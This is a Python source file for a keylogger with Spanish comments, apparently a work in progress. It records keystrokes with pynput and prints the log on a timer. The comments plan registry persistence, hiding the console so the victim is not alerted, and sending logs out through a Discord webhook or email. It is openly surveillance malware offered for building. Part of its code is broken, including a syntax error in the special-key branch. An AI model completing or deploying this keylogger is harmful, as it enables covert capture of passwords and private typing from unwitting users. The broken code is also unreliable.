import pynput
import threading
import tkinter as tk
log = ""





#SALTA ERROR AL DARLE A LAS TECLAS ESPECIALES. ¡(ARREGLAR)!
#AÑADIR UN SCRIPT DE PERSISTENCIA. AL APAGARSE EL ORDENADOR Y ENCENDERSE QUE SE VUELVA A EJECUTAR. ¿REGISTRO?
#LA CONSOLA SE DEBE DE OCULTAR PARA NO ALERTAR AL USUARIO

#¿UN BOT DE DISCORD TE MANDA UN MENSAJE.         SE NECESITARÍA DISCORDWEBHOOK?
#TE MANDA UN EMAIL 

class Keylogger:
    def __init__(self, time_intervalo):
        self.log = ""
        self.time_intervalo = time_intervalo
    def concatenar_al_log(self, string):
        self.log = self.log + string
        

    def tecla_presionada(self,key):
        global log
        try:
            current_Key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_Key = log + " "
            else:
                current_Key =  + " " + str(key) + " "
        self.concatenar_al_log(current_Key)
              # Muestra el texto entero 
            
            


    def reporte(self):
        global log 
        print(self.log)
        self.log = ""
        timer = threading.Timer(self.time_intervalo, self.reporte) #Cada x segundos se ejecuta la función reporte. Con while loop daría problemas según lo que he leído. 
        timer.start()                                               #Los segundos se pasan en el otro archivo. ejecutar_y_reportar.py 
                                                                    #

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.tecla_presionada)
        with keyboard_listener:
            self.reporte()
            keyboard_listener.join()
